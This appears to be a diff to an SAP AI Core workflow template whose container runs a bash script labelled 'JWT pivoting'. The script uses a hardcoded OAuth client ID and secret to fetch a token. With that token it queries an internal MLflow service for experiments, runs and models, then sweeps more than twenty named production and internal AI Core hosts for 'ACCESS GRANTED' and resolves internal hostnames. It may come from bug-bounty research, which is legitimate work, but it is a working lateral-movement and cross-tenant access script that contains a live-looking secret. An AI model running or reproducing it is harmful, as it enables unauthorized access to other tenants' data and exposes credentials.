@@ -10,71 +10,62 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "31.0.0"
+    ai.sap.com/version: "31.1.0"
 spec:
   entrypoint: main
-  arguments:
-    parameters:
-    - name: jwt
-      description: "API JWT token"
   templates:
   - name: main
-    inputs:
-      parameters:
-      - name: jwt
     metadata:
       labels:
         ai.sap.com/resourcePlan: starter
     container:
       image: nicolaka/netshoot:latest
-      env:
-      - name: API_JWT
-        value: "{{inputs.parameters.jwt}}"
       command:
       - bash
       - -c
       - |
-        echo "=== V31 JWT PIVOTING + CROSS-ENV ACCESS ==="
+        echo "=== V31 JWT PIVOTING ==="
         echo "=== $(date -u) ==="
-        echo "[*] JWT length: ${#API_JWT}"
+
+        # Get JWT from OAuth endpoint (internet egress confirmed)
+        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
+        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
+        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='
+        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
+          -H "Content-Type: application/x-www-form-urlencoded" \
+          --data-urlencode "grant_type=client_credentials" \
+          --data-urlencode "client_id=${CID}" \
+          --data-urlencode "client_secret=${CSC}" 2>&1 | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAILED'))" 2>/dev/null)
+        echo "[*] JWT obtained: ${#JWT} chars (first 20: ${JWT:0:20})"
+
+        if [ "$JWT" = "FAILED" ] || [ -z "$JWT" ]; then
+          echo "[-] JWT acquisition failed. Exiting."
+          exit 1
+        fi
 
         # -------------------------------------------------------
-        # PHASE 1: MLflow with API JWT
+        # PHASE 1: MLflow with JWT
         # -------------------------------------------------------
-        echo "=== PHASE1: MLFLOW CROSS-TENANT ==="
-        echo "[*] MLflow experiments list:"
-        curl -s --connect-timeout 5 \
-          -H "Authorization: Bearer ${API_JWT}" \
-          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" 2>&1 | head -c 3000
+        echo "=== PHASE1: MLFLOW ==="
+        ML="http://ml-tracking-service.ml-tracking.svc.cluster.local"
+        echo "[*] Experiments list:"
+        curl -s --connect-timeout 5 -H "Authorization: Bearer ${JWT}" "${ML}/api/2.0/mlflow/experiments/list" 2>&1 | head -c 3000
         echo ""
-
-        echo "[*] MLflow experiments search:"
-        curl -s --connect-timeout 5 \
-          -H "Authorization: Bearer ${API_JWT}" \
-          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/search?max_results=100" 2>&1 | head -c 3000
+        echo "[*] Experiments search:"
+        curl -s --connect-timeout 5 -H "Authorization: Bearer ${JWT}" "${ML}/api/2.0/mlflow/experiments/search?max_results=100" 2>&1 | head -c 3000
         echo ""
-
-        echo "[*] MLflow runs search (all experiments):"
-        curl -s --connect-timeout 5 -X POST \
-          -H "Authorization: Bearer ${API_JWT}" \
-          -H "Content-Type: application/json" \
-          -d '{"max_results":10}' \
-          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/runs/search" 2>&1 | head -c 3000
+        echo "[*] Runs search:"
+        curl -s --connect-timeout 5 -X POST -H "Authorization: Bearer ${JWT}" -H "Content-Type: application/json" \
+          -d '{"max_results":10}' "${ML}/api/2.0/mlflow/runs/search" 2>&1 | head -c 3000
         echo ""
-
-        echo "[*] MLflow registered models:"
-        curl -s --connect-timeout 5 \
-          -H "Authorization: Bearer ${API_JWT}" \
-          "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/registered-models/list?max_results=100" 2>&1 | head -c 3000
+        echo "[*] Registered models:"
+        curl -s --connect-timeout 5 -H "Authorization: Bearer ${JWT}" "${ML}/api/2.0/mlflow/registered-models/list?max_results=100" 2>&1 | head -c 2000
         echo ""
 
         # -------------------------------------------------------
-        # PHASE 2: Test external SAP AI Core hosts with JWT
-        # From inside the pod (internal network)
+        # PHASE 2: Cross-environment host testing
         # -------------------------------------------------------
-        echo "=== PHASE2: CROSS-ENVIRONMENT JWT TEST ==="
-
-        # High-value targets first
+        echo "=== PHASE2: CROSS-ENV HOST TEST ==="
         for host in \
           "internalprod-1.eu-central-1.aws.ml.hana.ondemand.com" \
           "internalprod-2.eu-central-1.aws.ml.hana.ondemand.com" \
@@ -98,63 +89,51 @@ spec:
           "prod.ap-southeast-2.aws.ml.hana.ondemand.com" \
           "intprod-eu12.eu-central-1.aws.ml.hana.ondemand.com" \
           "prodeuonly.eu-central-1.aws.ml.hana.ondemand.com" \
+          "preprod.ap-northeast-1.aws.ml.hana.ondemand.com" \
+          "workshop.eu-central-1.aws.ml.hana.ondemand.com" \
+          "perf-eu10.eu-central-1.aws.ml.hana.ondemand.com" \
           "bocr-eu-prd.eu-central-1.aws.ml.hana.ondemand.com" \
           "bocr-us-prod.us-east-1.aws.ml.hana.ondemand.com" \
-          "workshop.eu-central-1.aws.ml.hana.ondemand.com" \
-          "perf-eu10.eu-central-1.aws.ml.hana.ondemand.com"; do
+          "preprod-eu-1.eu-central-1.aws.ml.hana.ondemand.com" \
+          "preprod-eu-cc.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prod-eu-cc.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prod-br10.sa-east-1.aws.ml.hana.ondemand.com" \
+          "prod-ap11.ap-southeast-1.aws.ml.hana.ondemand.com"; do
 
-          # Quick check: resolve + hit /v2/lm/scenarios with our JWT
           resp=$(curl -sk --connect-timeout 3 --max-time 5 \
-            -o /tmp/host_resp.txt -w "%{http_code}" \
-            -H "Authorization: Bearer ${API_JWT}" \
+            -o /tmp/hr.txt -w "%{http_code}" \
+            -H "Authorization: Bearer ${JWT}" \
             -H "AI-Resource-Group: default" \
             "https://${host}/v2/lm/scenarios" 2>/dev/null)
 
           if [ "$resp" != "000" ]; then
-            body=$(head -c 200 /tmp/host_resp.txt)
-            echo "[${resp}] ${host}"
+            body=$(head -c 150 /tmp/hr.txt)
             if [ "$resp" = "200" ]; then
-              echo "  >>> ACCESS GRANTED: ${body}"
-            elif [ "$resp" != "401" ] && [ "$resp" != "403" ] && [ "$resp" != "404" ]; then
-              echo "  >>> ${body}"
+              echo "[!!!] ${host} -> ${resp} ACCESS GRANTED"
+              echo "  ${body}"
+            elif [ "$resp" != "000" ]; then
+              echo "[${resp}] ${host} -> ${body:0:80}"
             fi
           fi
         done
 
         # -------------------------------------------------------
-        # PHASE 3: Internal-only hosts (may only resolve from inside)
+        # PHASE 3: Internal DNS resolution test
         # -------------------------------------------------------
-        echo "=== PHASE3: INTERNAL DNS RESOLUTION ==="
+        echo "=== PHASE3: INTERNAL DNS ==="
         for host in \
           "internalprod-1.eu-central-1.aws.ml.hana.ondemand.com" \
           "internalprod-2.eu-central-1.aws.ml.hana.ondemand.com" \
           "internalprod-3.eu-central-1.aws.ml.hana.ondemand.com" \
           "training.internalprod.eu-central-1.aws.ml.hana.ondemand.com" \
           "esam.prod.eu-central-1.aws.ml.hana.ondemand.com" \
-          "esam.preprod.eu-central-1.aws.ml.hana.ondemand.com"; do
-          ip=$(nslookup "$host" 2>/dev/null | grep "Address:" | tail -1 | awk '{print $2}')
-          if [ -n "$ip" ] && [ "$ip" != "100.104.0.10" ]; then
-            echo "[+] ${host} -> ${ip}"
+          "prod-eu-cc.eu-central-1.aws.ml.hana.ondemand.com" \
+          "can-obs-eu10.eu-central-1.aws.ml.hana.ondemand.com" \
+          "prod-obs-eu10.eu-central-1.aws.ml.hana.ondemand.com"; do
+          ip=$(dig +short "$host" 2>/dev/null | head -1)
+          if [ -n "$ip" ]; then
+            echo "${host} -> ${ip}"
           fi
         done
-
-        # -------------------------------------------------------
-        # PHASE 4: Same JWT against our own API but from inside
-        # -------------------------------------------------------
-        echo "=== PHASE4: API FROM INSIDE POD ==="
-        echo "[*] Scenarios via API:"
-        curl -s --connect-timeout 5 \
-          -H "Authorization: Bearer ${API_JWT}" \
-          -H "AI-Resource-Group: default" \
-          "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2/lm/scenarios" 2>&1 | head -c 500
-        echo ""
-
-        # Try accessing other resource groups
-        echo "[*] Executions with bb-test-rg:"
-        curl -s --connect-timeout 5 \
-          -H "Authorization: Bearer ${API_JWT}" \
-          -H "AI-Resource-Group: bb-test-rg" \
-          "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2/lm/executions" 2>&1 | head -c 500
-        echo ""
 
         echo "=== V31 DONE $(date -u) ==="
